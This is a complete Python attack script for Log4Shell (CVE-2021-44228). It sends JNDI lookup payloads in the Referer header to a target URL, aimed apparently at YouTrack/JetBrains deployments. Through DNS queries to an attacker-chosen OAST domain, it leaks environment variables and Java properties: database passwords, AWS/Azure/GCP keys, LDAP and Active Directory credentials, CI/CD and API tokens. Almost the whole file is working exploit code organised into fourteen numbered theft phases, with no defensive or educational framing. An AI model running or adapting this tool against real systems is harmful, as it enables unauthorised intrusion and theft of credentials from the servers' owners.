#!/usr/bin/env python3
"""
Log4Shell DNS Env Variable Exfiltration
"""

import requests
import time
import sys
import urllib3
import argparse
from datetime import datetime
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# KRITISCHE SECRETS (Höchste Priorität)
# =============================================================================

# Database Credentials
DB_CREDENTIALS = [
    "DATABASE_URL",
    "DB_PASSWORD",
    "DB_USER",
    "DB_HOST",
    "DB_PORT",
    "DB_NAME",
    "JDBC_URL",
    "JDBC_PASSWORD",
    "MYSQL_PASSWORD",
    "MYSQL_USER",
    "MYSQL_ROOT_PASSWORD",
    "POSTGRES_PASSWORD",
    "POSTGRES_USER",
    "POSTGRESQL_PASSWORD",
    "MSSQL_PASSWORD",
    "ORACLE_PASSWORD",
    "MONGODB_URI",
    "MONGODB_PASSWORD",
    "REDIS_PASSWORD",
    "REDIS_URL",
]

# Cloud Provider Credentials
AWS_CREDENTIALS = [
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AWS_DEFAULT_REGION",
    "AWS_ACCOUNT_ID",
    "AWS_ROLE_ARN",
]

AZURE_CREDENTIALS = [
    "AZURE_CLIENT_ID",
    "AZURE_CLIENT_SECRET",
    "AZURE_TENANT_ID",
    "AZURE_SUBSCRIPTION_ID",
    "AZURE_USERNAME",
    "AZURE_PASSWORD",
]

GCP_CREDENTIALS = [
    "GOOGLE_APPLICATION_CREDENTIALS",
    "GOOGLE_CLOUD_PROJECT",
    "GCP_PROJECT",
    "GCP_SERVICE_ACCOUNT_KEY",
]

# Generic Secrets & API Keys
GENERIC_SECRETS = [
    "SECRET_KEY",
    "SECRET",
    "API_KEY",
    "API_SECRET",
    "API_TOKEN",
    "TOKEN",
    "PASSWORD",
    "ADMIN_PASSWORD",
    "ROOT_PASSWORD",
    "JWT_SECRET",
    "ENCRYPTION_KEY",
    "PRIVATE_KEY",
    "MASTER_KEY",
]

# Third-Party Service Tokens
SERVICE_TOKENS = [
    "SLACK_TOKEN",
    "SLACK_WEBHOOK_URL",
    "SLACK_API_TOKEN",
    "GITHUB_TOKEN",
    "GITHUB_PAT",
    "GITLAB_TOKEN",
    "BITBUCKET_TOKEN",
    "JIRA_TOKEN",
    "CONFLUENCE_TOKEN",
    "DOCKER_PASSWORD",
    "DOCKER_TOKEN",
    "NPM_TOKEN",
    "PYPI_TOKEN",
]

# YouTrack & JetBrains Specific
YOUTRACK_SECRETS = [
    "YOUTRACK_DATABASE_URL",
    "YOUTRACK_DB_PASSWORD",
    "YOUTRACK_TOKEN",
    "YOUTRACK_ADMIN_PASSWORD",
    "YOUTRACK_HUB_URL",
    "YOUTRACK_HUB_TOKEN",
    "YOUTRACK_MAILBOX_PASSWORD",
    "YOUTRACK_SMTP_PASSWORD",
    "HUB_URL",
    "HUB_TOKEN",
    "HUB_ADMIN_PASSWORD",
    "HUB_DATABASE_URL",
    "HUB_DB_PASSWORD",
    "TEAMCITY_TOKEN",
    "SPACE_TOKEN",
]

# LDAP/Active Directory
LDAP_CREDENTIALS = [
    "LDAP_BIND_PASSWORD",
    "LDAP_BIND_DN",
    "LDAP_ADMIN_PASSWORD",
    "AD_SERVICE_PASSWORD",
    "AD_BIND_PASSWORD",
    "AD_USERNAME",
    "AD_PASSWORD",
    "DOMAIN_ADMIN_PASSWORD",
]

# Email/SMTP Credentials
EMAIL_CREDENTIALS = [
    "SMTP_PASSWORD",
    "SMTP_USER",
    "MAIL_PASSWORD",
    "EMAIL_PASSWORD",
    "SENDGRID_API_KEY",
    "MAILGUN_API_KEY",
]

# CI/CD Secrets
CICD_SECRETS = [
    "JENKINS_TOKEN",
    "JENKINS_PASSWORD",
    "GITLAB_CI_TOKEN",
    "GITHUB_ACTIONS_TOKEN",
    "CI_JOB_TOKEN",
    "DEPLOY_TOKEN",
    "ARTIFACT_TOKEN",
]

# Backup & Storage
BACKUP_CREDENTIALS = [
    "S3_ACCESS_KEY",
    "S3_SECRET_KEY",
    "BACKUP_PASSWORD",
    "FTP_PASSWORD",
    "SFTP_PASSWORD",
    "RSYNC_PASSWORD",
]

SYSTEM_ENV_VARS = [
    "COMPUTERNAME",
    "USERNAME",
    "USERDOMAIN",
    "LOGONSERVER",
    "SYSTEMROOT",
    "PROCESSOR_ARCHITECTURE",
    "NUMBER_OF_PROCESSORS",
    "OS",
]

JAVA_SYS_PROPS = [
    "java.version",
    "java.vendor",
    "os.name",
    "os.arch",
    "os.version",
    "user.name",
]

NETWORK_INFO = [
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
    "PROXY_USER",
    "PROXY_PASSWORD",
]

# =============================================================================
# GLOBAL STATE
# =============================================================================

class ExfiltrationTracker:
    def __init__(self):
        self.results = defaultdict(list)
        self.total = 0
        self.success = 0
        self.failed = 0
        
    def add_attempt(self, var_name, label, category, success):
        self.total += 1
        if success:
            self.success += 1
            self.results[category].append((var_name, label))
        else:
            self.failed += 1

tracker = ExfiltrationTracker()

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description='Log4Shell DNS Exfiltration',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://target.com/)'
    )
    
    parser.add_argument(
        '-d', '--domain',
        required=True,
        help='OAST domain (e.g., abc123.oastify.com or abc123.interact.sh)'
    )
    
    parser.add_argument(
        '--delay',
        type=float,
        default=0.5,
        help='Delay between requests in seconds (default: 0.5)'
    )
    
    return parser.parse_args()

def send_payload(target, payload):
    """Sendet Payload im Referer Header"""
    headers = {
        "Referer": payload,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "close"
    }
    
    try:
        requests.get(
            target,
            params={"FSMSCommand": "test"},
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        return True
    except Exception:
        return False

def exfiltrate_env_var(target, oast_domain, var_name, label, category, description=""):
    """Exfiltriert Environment Variable"""
    payload = f"${{jndi:ldap://{label}.${{env:{var_name}}}.{oast_domain}}}"
    
    desc_str = f" ({description})" if description else ""
    print(f"[+] {var_name:40s} -> {label:30s}{desc_str}", end=" ", flush=True)
    
    success = send_payload(target, payload)
    print("OK" if success else "FAIL")
    
    tracker.add_attempt(var_name, label, category, success)
    return success

def exfiltrate_sys_prop(target, oast_domain, prop_name, label, category, description=""):
    """Exfiltriert Java System Property"""
    payload = f"${{jndi:ldap://{label}.${{sys:{prop_name}}}.{oast_domain}}}"
    
    desc_str = f" ({description})" if description else ""
    print(f"[+] {prop_name:40s} -> {label:30s}{desc_str}", end=" ", flush=True)
    
    success = send_payload(target, payload)
    print("OK" if success else "FAIL")
    
    tracker.add_attempt(prop_name, label, category, success)
    return success

def exfiltrate_combined(target, oast_domain, vars_data, label, category, description=""):
    """Exfiltriert mehrere Werte kombiniert"""
    var_parts = []
    var_names = []
    for var_type, var_name in vars_data:
        var_names.append(var_name)
        if var_type == "env":
            var_parts.append(f"${{env:{var_name}}}")
        else:
            var_parts.append(f"${{sys:{var_name}}}")
    
    combined = ".".join(var_parts)
    payload = f"${{jndi:ldap://{label}.{combined}.{oast_domain}}}"
    
    desc_str = f" ({description})" if description else ""
    display_name = "+".join(var_names)
    print(f"[+] Combined: {display_name:30s} -> {label:20s}{desc_str}", end=" ", flush=True)
    
    success = send_payload(target, payload)
    print("OK" if success else "FAIL")
    
    tracker.add_attempt(display_name, label, category, success)
    return success

def print_banner(target, oast_domain, delay):
    """Zeigt Banner"""
    print("""
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║      Log4Shell DNS Exfiltration - Secrets Hunter v3.1             ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Target:      {target}")
    print(f"[*] OAST Domain: {oast_domain}")
    print(f"[*] Delay:       {delay}s between requests")
    print(f"[*] Started:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

def print_section(title):
    """Zeigt Section Header"""
    print(f"\n{'='*70}")
    print(f"  {title}")
    print('='*70)

def run_exfiltration(args):
    """Führt die Exfiltration durch"""
    
    # PHASE 1: Database Credentials
    print_section("PHASE 1: Database Credentials")
    for var in DB_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"db-{label}", "Database", "Database")
        time.sleep(args.delay)
    
    # PHASE 2: YouTrack & JetBrains Secrets
    print_section("PHASE 2: YouTrack & JetBrains Secrets")
    for var in YOUTRACK_SECRETS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"yt-{label}", "YouTrack", "YouTrack")
        time.sleep(args.delay)
    
    # PHASE 3: LDAP/Active Directory
    print_section("PHASE 3: LDAP/Active Directory Credentials")
    for var in LDAP_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"ldap-{label}", "LDAP", "LDAP/AD")
        time.sleep(args.delay)
    
    # PHASE 4: AWS Credentials
    print_section("PHASE 4: AWS Credentials")
    for var in AWS_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"aws-{label}", "AWS", "AWS")
        time.sleep(args.delay)
    
    # PHASE 5: Azure Credentials
    print_section("PHASE 5: Azure Credentials")
    for var in AZURE_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"azure-{label}", "Azure", "Azure")
        time.sleep(args.delay)
    
    # PHASE 6: Google Cloud Credentials
    print_section("PHASE 6: Google Cloud Credentials")
    for var in GCP_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"gcp-{label}", "GCP", "GCP")
        time.sleep(args.delay)
    
    # PHASE 7: Generic Secrets
    print_section("PHASE 7: Generic Secrets & API Keys")
    for var in GENERIC_SECRETS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"sec-{label}", "Secrets", "Secret")
        time.sleep(args.delay)
    
    # PHASE 8: Service Tokens
    print_section("PHASE 8: Third-Party Service Tokens")
    for var in SERVICE_TOKENS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"svc-{label}", "Services", "Service")
        time.sleep(args.delay)
    
    # PHASE 9: Email/SMTP
    print_section("PHASE 9: Email/SMTP Credentials")
    for var in EMAIL_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"mail-{label}", "Email", "Email")
        time.sleep(args.delay)
    
    # PHASE 10: CI/CD Secrets
    print_section("PHASE 10: CI/CD Secrets")
    for var in CICD_SECRETS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"cicd-{label}", "CICD", "CI/CD")
        time.sleep(args.delay)
    
    # PHASE 11: Backup & Storage
    print_section("PHASE 11: Backup & Storage Credentials")
    for var in BACKUP_CREDENTIALS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"backup-{label}", "Backup", "Backup")
        time.sleep(args.delay)
    
    # PHASE 12: Network & Proxy
    print_section("PHASE 12: Network & Proxy Information")
    for var in NETWORK_INFO:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"net-{label}", "Network", "Network")
        time.sleep(args.delay)
    
    # PHASE 13: System Information
    print_section("PHASE 13: System Information")
    for var in SYSTEM_ENV_VARS:
        label = var.replace("_", "-").lower()
        exfiltrate_env_var(args.target, args.domain, var, f"sys-{label}", "System", "System")
        time.sleep(args.delay)
    
    for prop in JAVA_SYS_PROPS:
        label = prop.replace(".", "-")
        exfiltrate_sys_prop(args.target, args.domain, prop, f"java-{label}", "Java", "Java")
        time.sleep(args.delay)
    
    # PHASE 14: Combined Extractions
    print_section("PHASE 14: Combined Extractions")
    
    combinations = [
        ([("env", "DB_USER"), ("env", "DB_PASSWORD")], "dbcreds", "Combined", "DB User+Pass"),
        ([("env", "COMPUTERNAME"), ("env", "USERNAME")], "hostuser", "Combined", "Host+User"),
        ([("env", "AWS_ACCESS_KEY_ID"), ("env", "AWS_SECRET_ACCESS_KEY")], "awscreds", "Combined", "AWS Creds"),
        ([("env", "USERDOMAIN"), ("env", "LOGONSERVER")], "domain", "Combined", "Domain Info"),
        ([("sys", "java.version"), ("sys", "os.name")], "platform", "Combined", "Platform"),
    ]
    
    for vars_data, label, category, desc in combinations:
        exfiltrate_combined(args.target, args.domain, vars_data, label, category, desc)
        time.sleep(args.delay)

def main():
    args = parse_args()
    
    print_banner(args.target, args.domain, args.delay)
    
    input("[*] Press ENTER to start exfiltration (or Ctrl+C to abort)...")
    print()
    
    # Run exfiltration
    run_exfiltration(args)
    
    # Statistics
    print_section("EXFILTRATION PHASE COMPLETE")
    print(f"""
[*] Statistics:
    Total Requests:     {tracker.total}
    Successful Sends:   {tracker.success}
    Failed Sends:       {tracker.failed}
    """)
    
    print(f"\n[*] Check results in your OAST service: {args.domain}")
    
    print_section("OPERATION COMPLETE")
    print(f"[*] Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70 + "\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Exfiltration interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
